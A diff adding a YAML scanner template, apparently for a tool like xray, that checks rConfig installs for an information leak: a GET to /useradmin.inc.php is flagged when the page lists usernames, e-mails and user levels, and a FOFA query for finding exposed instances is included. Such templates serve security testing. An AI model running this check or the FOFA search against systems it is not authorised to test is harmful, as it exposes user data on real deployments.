@@ -1,0 +1,24 @@
+id: poc-yaml-rconfig-useradmin-inc-php-information-leak
+info:
+  name: rConfig useradmin.inc.php 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: rConfig
+  fofa: app="rConfig"
+requests:
+- method: GET
+  path: /useradmin.inc.php
+  expression: 'status_code == 200
+
+    && contains(body,"Username")
+
+    && contains(body,"E-mail")
+
+    && contains(body,"User Level")
+
+    && contains(body,"Items per page")
+
+    '
+variables: {}
+transport: http
